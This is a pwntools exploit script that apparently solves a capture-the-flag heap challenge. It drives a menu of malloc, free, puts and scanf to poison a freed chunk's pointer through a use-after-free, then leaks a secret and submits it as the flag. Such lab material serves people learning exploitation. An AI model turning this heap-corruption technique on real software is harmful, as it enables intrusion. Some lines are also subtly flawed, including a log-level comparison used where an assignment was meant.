#!/usr/bin/python3

from pwn import *

context.arch = "amd64"
context.log_level == "error"

elf = context.binary = ELF("/challenge/seeking-smuggled-secrets-easy")

def malloc(io,index,size):
    data = io.recvuntil(b"Function (malloc/free/puts/scanf/send_flag/quit):")
    print(data.decode())
    io.sendline(b"malloc")
    i = io.recvuntil(b"Index:")
    print(i.decode())
    io.sendline(str(index).encode())
    s = io.recvuntil(b"Size:")
    print(s.decode())
    io.sendline(str(size).encode())
    return io

def puts(io,index):
    data = io.recvuntil(b"Function (malloc/free/puts/scanf/send_flag/quit):")
    print(data.decode('latin-1'))
    io.sendline(b"puts")
    io.sendlineafter(b"Index:",str(index).encode())
    return io

def free(io,index):
    data = io.recvuntil(b"Function (malloc/free/puts/scanf/send_flag/quit):")
    print(data.decode())
    io.sendline(b"free")
    io.sendlineafter(b"Index:",str(index).encode())
    return io

def send_flag(io,secret):
    data = io.recvuntil(b"Function (malloc/free/puts/scanf/send_flag/quit):")
    print(data.decode())
    io.sendline(b"send_flag")
    io.sendline(secret)
    return io

def quit(io):
    data = io.recvuntil(b"Function (malloc/free/puts/scanf/send_flag/quit):")
    print(data.decode())
    io.sendline(b"quit")
    return io

def puts_flag(io,index):
    data = io.recvuntil(b"Function (malloc/free/puts/scanf/send_flag/quit):")
    print(data.decode())
    io.sendline(b"puts_flag")
    print(io.recvline().decode())
    return io

def scanf(io,index,d):
    data = io.recvuntil(b"Function (malloc/free/puts/scanf/send_flag/quit):")
    print(data.decode())
    io.sendline(b"scanf")
    io.sendline(str(index).encode())
    io.sendline(d)
    return io

def main(address):
    io = process()
    io = malloc(io,0,0x348)
    io = malloc(io,1,0x348)
    io = free(io,0)
    io = free(io,1)
    io = scanf(io,1,address.to_bytes(3,"little"))
    io = malloc(io,2,0x348)
    io = malloc(io,3,0x348)
    io = free(io,2)
    io = puts(io,2)
    io.recvuntil(b"Data: ")
    secret = io.recvline()[:8]
    return io,secret

if __name__ == "__main__":
    add = 0x42ad6f
    io,secret1 = main(0x42ad6f)
    io,secret2 = main(add + 0x8)
    secret = secret1 + secret2
    io = send_flag(io,secret)
    io.interactive()
